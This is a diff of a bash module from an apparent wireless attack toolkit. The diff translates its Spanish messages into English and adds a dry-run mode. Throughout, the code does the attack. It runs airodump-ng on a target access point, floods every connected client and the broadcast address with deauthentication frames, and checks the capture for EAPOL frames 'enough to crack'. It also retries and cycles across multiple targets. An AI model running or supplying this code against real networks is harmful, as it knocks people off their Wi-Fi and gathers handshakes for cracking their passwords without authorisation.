@@ -1,12 +1,12 @@
 #!/usr/bin/env bash
-# lib/capture.sh — Lógica de captura de handshake WPA2
-# No ejecutar directamente. Cargado por wlab.sh
+# lib/capture.sh -- WPA2 handshake capture.
+# Not executed directly. Loaded by the entrypoint.
 #
 # FLUJO POR INTENTO:
-#   1. (Solo primer intento) Escanear clientes del AP
+#   1. (First attempt only) Scan clients on the AP
 #   2. Iniciar airodump-ng en background              ← PRIMERO, siempre
 #   3. Esperar 2s a que airodump abra el pcap
-#   4. Deauth a TODOS los clientes en paralelo + broadcast  ← DESPUÉS
+#   4. Deauth to ALL clients in parallel + broadcast  <- AFTER
 #   5. Monitorear sin tiempo predefinido:
 #        · Cada 1s: tshark (rápido) si disponible — detección temprana
 #        · Cada 3s: aircrack-ng (definitivo) — confirmación
@@ -15,8 +15,8 @@
 #   6. Handshake → matar procesos, salir con éxito
 #   7. Sin handshake → siguiente intento
 #
-# MULTI-TARGET: capture() retorna 1 en vez de die() para que el loop
-# en wlab.sh pueda continuar con el siguiente target.
+# MULTI-TARGET: capture() returns 1 instead of die() so the loop in
+# the entrypoint can continue with the next target.
 
 # _hs_tshark: verificación rápida y barata con tshark.
 # Retorna 0 si hay ≥2 frames EAPOL en el .cap.
@@ -56,11 +56,11 @@ _check_handshake() {
             -e frame.number 2>/dev/null | wc -l) || true
 
     if (( hs_count > 0 )); then
-        ok "¡Handshake capturado! (aircrack: ${hs_count} | EAPOL: ${eapol_count} frames)"
+        ok "Handshake captured! (aircrack: ${hs_count} | EAPOL: ${eapol_count} frames)"
         return 0
     fi
     if (( eapol_count >= 2 )); then
-        ok "¡Handshake parcial válido! (${eapol_count} EAPOL frames — suficiente para crackear)"
+        ok "Partial handshake valid! (${eapol_count} EAPOL frames -- enough to crack)"
         return 0
     fi
 
@@ -79,11 +79,11 @@ _monitor_capture() {
         # Guardia: airodump muerto inesperadamente
         if ! kill -0 "$adump" 2>/dev/null; then
             echo "" >&2
-            warn "airodump-ng terminó inesperadamente."
+            warn "airodump-ng terminated unexpectedly."
             return 1
         fi
 
-        printf "\r  ${C}[%3ds] dump=%-6s deauth=%-6s clientes=%-2s${N}" \
+        printf "\r  ${C}[%3ds] dump=%-6s deauth=%-6s clients=%-2s${N}" \
             "$elapsed" "$adump" "$deauth_pid" "$clients" >&2
 
         # Cada segundo: tshark (barato) → si positivo, confirmar con aircrack
@@ -106,7 +106,7 @@ _monitor_capture() {
         # Límite de seguridad: nunca bloquear indefinidamente
         if (( elapsed >= CAP_MAX_SEC )); then
             echo "" >&2
-            warn "Límite de seguridad alcanzado (${CAP_MAX_SEC}s) sin handshake en este intento."
+            warn "Safety limit reached (${CAP_MAX_SEC}s) with no handshake in this attempt."
             return 1
         fi
 
@@ -117,34 +117,41 @@ _monitor_capture() {
 
 # capture_once: ciclo completo de intentos. Retorna 0 si capturó handshake.
 capture_once() {
-    local base="${TMP}/cap_${TARGET//:/_}"   # prefijo único por target
+    if [[ "$WAI_DRY_RUN" == "1" ]]; then
+        dbg "[dry-run] capture_once: airodump-ng + deauth on $MON"
+        CAP_FILE="${TMP}/cap_dryrun.cap"
+        return 0
+    fi
+    local base="${TMP}/cap_${TARGET//:/_}"
 
-    # ── Escaneo de clientes (una sola vez — reutilizado en todos los intentos) ──
-    hdr "Detectando clientes en '${SSID_NAME}'"
+    # -- Client scan (once -- reused across all attempts) --
+    hdr "Detecting clients on '${SSID_NAME}'"
     local clients_count
     clients_count=$(detect_clients)
-    [[ ! "$clients_count" =~ ^[0-9]+$ ]] && clients_count=0
-
-    if (( clients_count > 0 )); then
-        ok "${clients_count} cliente(s) detectado(s) — deauth paralelo a todos + broadcast."
-    else
-        warn "0 clientes detectados — solo deauth broadcast."
-        warn "  Sin clientes el handshake es muy difícil. Verifica que haya dispositivos conectados."
+    if [[ ! "$clients_count" =~ ^[0-9]+$ ]]; then
+        clients_count=0
     fi
 
-    info "Intentos planificados: ${MAX_TRIES_DEFAULT}"
+    if (( clients_count > 0 )); then
+        ok "${clients_count} client(s) detected -- parallel deauth to all + broadcast."
+    else
+        warn "0 clients detected -- broadcast deauth only."
+        warn "  Without clients the handshake is very hard. Verify devices are connected."
+    fi
+
+    info "Planned attempts: ${MAX_TRIES_DEFAULT}"
 
     # ── Loop de intentos ────────────────────────────────────────────────────────
     local attempt=1
     while (( attempt <= MAX_TRIES_DEFAULT )); do
-        hdr "Intento ${attempt}/${MAX_TRIES_DEFAULT} — BSSID=${TARGET}  Canal=${CHANNEL}"
+        hdr "Attempt ${attempt}/${MAX_TRIES_DEFAULT} -- BSSID=${TARGET}  Channel=${CHANNEL}"
 
         rm -f "${base}"-*.cap 2>/dev/null || true
         local cap_log="${TMP}/cap_attempt${attempt}_${TARGET//:/_}.log"
         local deauth_log="${TMP}/deauth_attempt${attempt}_${TARGET//:/_}.log"
 
         # ── PASO 1: airodump-ng PRIMERO ──────────────────────────────────────
-        info "Iniciando captura (airodump-ng, canal ${CHANNEL})..."
+        info "Starting capture (airodump-ng, channel ${CHANNEL})..."
         airodump-ng \
             --bssid         "$TARGET"  \
             --channel       "$CHANNEL" \
@@ -157,13 +164,13 @@ capture_once() {
         # Esperar a que airodump abra el pcap y esté listo para capturar
         sleep 2
         if ! kill -0 "$adump" 2>/dev/null; then
-            warn "airodump-ng murió al iniciar (intento ${attempt}). Log:"
+            warn "airodump-ng died at start (attempt ${attempt}). Log:"
             while IFS= read -r l; do warn "  $l"; done < "$cap_log" || true
             attempt=$(( attempt+1 )); continue
         fi
-        ok "airodump-ng activo (PID ${adump})."
+        ok "airodump-ng active (PID ${adump})."
 
-        # ── PASO 2: deauth a TODOS los clientes en paralelo + broadcast ──────
+        # -- STEP 2: deauth to ALL clients in parallel + broadcast ------
         local deauth_pid
         deauth_pid=$(run_deauth "$deauth_log")
         dbg "Deauth PID: ${deauth_pid}"
@@ -182,17 +189,17 @@ capture_once() {
         kill "$adump"      2>/dev/null || true; wait "$adump"      2>/dev/null || true
         sleep 1
 
-        dbg "Log deauth intento ${attempt}:"
+        dbg "Deauth log attempt ${attempt}:"
         while IFS= read -r l; do dbg "  $l"; done < "$deauth_log" 2>/dev/null || true
 
-        # Revisión final del .cap aunque el monitor no lo haya detectado en tiempo real
+        # Final .cap review even if the monitor loop missed it in real time
         if [[ -f "$cf" ]] && _check_handshake "$cf"; then
             CAP_FILE="$cf"
             return 0
         fi
 
-        warn "Sin handshake en intento ${attempt}/${MAX_TRIES_DEFAULT}."
-        (( attempt < MAX_TRIES_DEFAULT )) && { info "Esperando 3s antes del siguiente intento..."; sleep 3; }
+        warn "No handshake on attempt ${attempt}/${MAX_TRIES_DEFAULT}."
+        (( attempt < MAX_TRIES_DEFAULT )) && { info "Waiting 3s before next attempt..."; sleep 3; }
         attempt=$(( attempt+1 ))
     done
 
@@ -202,7 +209,7 @@ capture_once() {
 # capture: orquesta capture_once con re-escaneo si la caché estaba expirada.
 # En modo multi-target retorna 1 en lugar de die() para no abortar la sesión.
 capture() {
-    hdr "Captura de handshake WPA2 — ${SSID_NAME:-$TARGET}"
+    hdr "WPA2 handshake capture -- ${SSID_NAME:-$TARGET}"
 
     if capture_once; then
         write_meta
@@ -210,7 +217,7 @@ capture() {
     fi
 
     if (( META_LOADED == 2 )); then
-        warn "Fallo con caché expirada — re-escaneando para verificar datos..."
+        warn "Stale cache failed -- rescanning to verify data..."
         local old_target="$TARGET" old_channel="$CHANNEL"
         META_LOADED=0; rm -f "$META_FILE" 2>/dev/null || true
 
@@ -236,7 +243,7 @@ capture() {
         fi
 
         if [[ -z "$new_bssid" || -z "$new_channel" ]]; then
-            warn "Re-escaneo sin resultados para '${SSID_NAME}'. ¿AP encendido y en rango?"
+            warn "Rescan found nothing for '${SSID_NAME}'. Is the AP on and in range?"
             _record_target_failure
             return 1
         fi
@@ -245,32 +252,32 @@ capture() {
         dbg "Comparando: old=${old_target}/${old_channel}  new=${new_bssid}/${new_channel}"
 
         if [[ "$new_bssid" != "$old_target" || "$new_channel" != "$old_channel" ]]; then
-            warn "Datos actualizados: BSSID ${old_target}→${new_bssid}  Canal ${old_channel}→${new_channel}"
+            warn "Data updated: BSSID ${old_target} -> ${new_bssid}  Channel ${old_channel} -> ${new_channel}"
             TARGET="$new_bssid"; CHANNEL="$new_channel"
             write_meta
             if capture_once; then
                 write_meta
                 return 0
             fi
-            warn "Sin handshake tras reintento con datos renovados — continuando con siguiente target."
+            warn "No handshake after retry with refreshed data -- moving to next target."
             _record_target_failure
             return 1
         else
             write_meta
-            warn "Sin handshake. Datos verificados correctos."
-            warn "  Causas: sin clientes activos, señal débil, PMF/MFP activo en el AP."
+            warn "No handshake. Data verified correct."
+            warn "  Causes: no active clients, weak signal, PMF/MFP enabled on the AP."
             _record_target_failure
             return 1
         fi
 
     elif (( META_LOADED == 1 )); then
-        warn "Sin handshake. Caché fresca — datos correctos."
-        warn "  Causas: sin clientes activos, señal débil, PMF activo."
+        warn "No handshake. Fresh cache -- data correct."
+        warn "  Causes: no active clients, weak signal, PMF enabled."
         _record_target_failure
         return 1
     else
         warn "Sin handshake."
-        warn "  Causas: sin clientes activos, señal débil, AP fuera de rango."
+        warn "  Causes: no active clients, weak signal, AP out of range."
         _record_target_failure
         return 1
     fi
